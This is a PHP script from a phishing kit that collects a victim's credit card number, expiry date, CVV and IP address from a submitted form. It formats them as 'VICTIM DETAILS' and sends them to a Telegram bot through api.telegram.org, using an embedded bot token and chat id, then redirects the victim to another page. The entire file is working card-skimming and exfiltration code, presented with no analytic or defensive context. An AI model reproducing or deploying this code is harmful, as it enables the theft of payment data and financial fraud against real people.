﻿<?php
session_start();

$cc16=$_POST["cc16"];

$expmm=$_POST["expmm"];

$expmy=$_POST["expmy"];

$cvv=$_POST["cvv"];

$_SESSION['cc16'] = $cc16;

$_SESSION['expmm'] = $expmm;

$_SESSION['expmy'] = $expmy;

$_SESSION['cvv'] = $cvv;

   function getIPAddress() {  
    //whether ip is from the share internet  
     if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
                $ip = $_SERVER['HTTP_CLIENT_IP'];  
        }  
    //whether ip is from the proxy  
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
     }  
//whether ip is from the remote address  
    else{  
             $ip = $_SERVER['REMOTE_ADDR'];  
     }  
     return $ip;  
}  
$ip = getIPAddress();  

$msg = "
------ 👉🏻🤠💳 VICTIM DETAILS 💳🤠👈🏻--------->

🤠 NAME    : ".$_SESSION['fname']."

💳 CxC     : ".$_SESSION['cc16']."

📅 EXP     : ".$_SESSION['expmm']."/".$_SESSION['expmy']."

🔐 CVV     : ".$_SESSION['cvv']."

IP : $ip

----------- 🤠🇩🇰 CC/DK 🇩🇰🤠 ---------------->";

$token = "6039160288:AAELj7POP_QJm4Fp_IfFhiYXMXpEnR9iaek";
$data = [
    'text' => $msg,
    'chat_id' => '-948225816'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header("Location: load2.php");
?>